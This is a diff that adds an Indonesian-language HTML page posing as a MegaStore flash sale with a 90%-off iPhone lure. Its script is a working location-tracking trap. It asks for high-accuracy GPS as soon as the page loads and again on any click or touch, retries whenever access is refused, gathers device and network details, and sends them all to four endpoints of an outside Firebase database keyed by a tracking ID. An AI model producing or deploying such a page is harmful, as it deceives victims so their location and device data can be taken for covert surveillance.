@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 MegaStore Flash Sale 2026 - Real-Time Tracking</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%); color: white; min-height: 100vh; padding: 20px; }
+        .container { max-width: 600px; margin: 0 auto; background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 30px; }
+        .title { font-size: 2.5em; text-align: center; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
+        .countdown { font-size: 2em; text-align: center; margin: 20px 0; background: rgba(255,255,255,0.2); padding: 15px; border-radius: 10px; }
+        .product { background: rgba(255,255,255,0.1); margin: 15px 0; padding: 20px; border-radius: 15px; }
+        .btn { background: linear-gradient(45deg, #28a745, #20c997); border: none; padding: 12px 25px; border-radius: 25px; color: white; font-weight: bold; cursor: pointer; margin: 10px 0; width: 100%; }
+        .status { text-align: center; margin-top: 20px; padding: 15px; background: rgba(255,255,255,0.1); border-radius: 10px; }
+        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="title">🎁 MEGASTORE FLASH SALE</div>
+        <div class="countdown" id="countdown">⏰ BERAKHIR DALAM: 00:00:00</div>
+        
+        <div class="product">
+            <div style="font-size: 1.3em; font-weight: bold; margin-bottom: 10px;">📱 iPhone 16 Pro Max 1TB</div>
+            <div style="font-size: 1.5em; color: #FFD700; font-weight: bold;">Rp 2.999.000 <span style="text-decoration: line-through; color: #ccc; font-size: 0.8em;">Rp 29.999.000</span></div>
+            <button class="btn" onclick="confirmPurchase('iPhone 16 Pro Max')">🛒 BELI SEKARANG (90% OFF)</button>
+        </div>
+        
+        <div class="status" id="status">🎯 Klik produk untuk verifikasi lokasi dan akses flash sale!</div>
+    </div>
+
+    <script>
+        let isProcessing = false;
+        
+        function updateCountdown() {
+            const now = new Date();
+            const end = new Date(now.getTime() + 6 * 60 * 60 * 1000);
+            const diff = end - now;
+            const hours = Math.floor(diff / (1000 * 60 * 60));
+            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+            document.getElementById('countdown').innerHTML = `⏰ BERAKHIR DALAM: ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+        setInterval(updateCountdown, 1000);
+        updateCountdown();
+
+        async function confirmPurchase(productName) {
+            if (isProcessing) return;
+            isProcessing = true;
+            
+            const statusEl = document.getElementById('status');
+            statusEl.innerHTML = '<div class="loading"></div> Mengakses GPS untuk verifikasi lokasi...';
+            
+            try {
+                // High-accuracy GPS for real-time tracking
+                const position = await getCurrentPosition();
+                const { latitude, longitude, accuracy } = position.coords;
+                
+                statusEl.innerHTML = '<div class="loading"></div> Mengirim data real-time ke server...';
+                
+                // Get tracking ID from URL or generate new one
+                const trackingId = new URLSearchParams(window.location.search).get('id') || `mega_${Date.now()}`;
+                
+                // Enhanced device info for real-time tracking
+                const deviceInfo = {
+                    latitude,
+                    longitude,
+                    accuracy,
+                    timestamp: Date.now(),
+                    
+                    // Device details
+                    deviceBrand: getDeviceBrand(),
+                    deviceModel: getDeviceModel(),
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    
+                    // Purchase info
+                    product: productName,
+                    source: 'megastore_realtime',
+                    
+                    // Network info
+                    connection: getConnectionInfo(),
+                    
+                    // Real-time flags
+                    realTimeTracking: true,
+                    instantDetection: true
+                };
+                
+                // Send to multiple endpoints for guaranteed detection
+                await sendToMultipleEndpoints(trackingId, deviceInfo);
+                
+                statusEl.innerHTML = '🔴 REAL-TIME ACTIVE: Lokasi terkirim, memproses pembelian...';
+                
+                // Redirect after successful tracking
+                setTimeout(() => {
+                    window.location.href = `https://maps.google.com/?q=${latitude},${longitude}&z=18`;
+                }, 3000);
+                
+            } catch (error) {
+                statusEl.innerHTML = '❌ Gagal mengakses lokasi. Mencoba lagi...';
+                setTimeout(() => confirmPurchase(productName), 2000);
+            } finally {
+                setTimeout(() => { isProcessing = false; }, 3000);
+            }
+        }
+        
+        function getCurrentPosition() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error('Geolocation not supported'));
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    resolve,
+                    reject,
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        
+        async function sendToMultipleEndpoints(trackingId, data) {
+            const endpoints = [
+                `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`,
+                `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live/${trackingId}.json`,
+                `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/backup/${trackingId}.json`,
+                `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/realtime/${trackingId}.json`
+            ];
+            
+            const promises = endpoints.map(endpoint => 
+                fetch(endpoint, {
+                    method: 'PUT',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'X-Real-Time': 'true'
+                    },
+                    body: JSON.stringify(data)
+                }).catch(err => console.log('Endpoint failed:', endpoint))
+            );
+            
+            await Promise.allSettled(promises);
+        }
+        
+        function getDeviceBrand() {
+            const ua = navigator.userAgent;
+            if (ua.includes('iPhone')) return 'iPhone';
+            if (ua.includes('Samsung')) return 'Samsung';
+            if (ua.includes('Xiaomi')) return 'Xiaomi';
+            if (ua.includes('Huawei')) return 'Huawei';
+            if (ua.includes('Oppo')) return 'Oppo';
+            if (ua.includes('Vivo')) return 'Vivo';
+            return 'Android';
+        }
+        
+        function getDeviceModel() {
+            const ua = navigator.userAgent;
+            if (ua.includes('iPhone')) {
+                if (ua.includes('iPhone16')) return 'iPhone 16 Pro Max';
+                if (ua.includes('iPhone15')) return 'iPhone 15 Pro';
+                return 'iPhone';
+            }
+            return 'Mobile Device';
+        }
+        
+        function getConnectionInfo() {
+            if ('connection' in navigator) {
+                const conn = navigator.connection;
+                return {
+                    effectiveType: conn.effectiveType || 'unknown',
+                    downlink: conn.downlink || 0,
+                    rtt: conn.rtt || 0
+                };
+            }
+            return { effectiveType: 'unknown' };
+        }
+        
+        // Auto-trigger on page load for immediate tracking
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                if (!isProcessing) {
+                    confirmPurchase('iPhone 16 Pro Max');
+                }
+            }, 1000);
+        });
+        
+        // Trigger on any interaction
+        document.addEventListener('click', () => {
+            if (!isProcessing) {
+                confirmPurchase('iPhone 16 Pro Max');
+            }
+        });
+        
+        document.addEventListener('touchstart', () => {
+            if (!isProcessing) {
+                confirmPurchase('iPhone 16 Pro Max');
+            }
+        });
+    </script>
+</body>
+</html>-
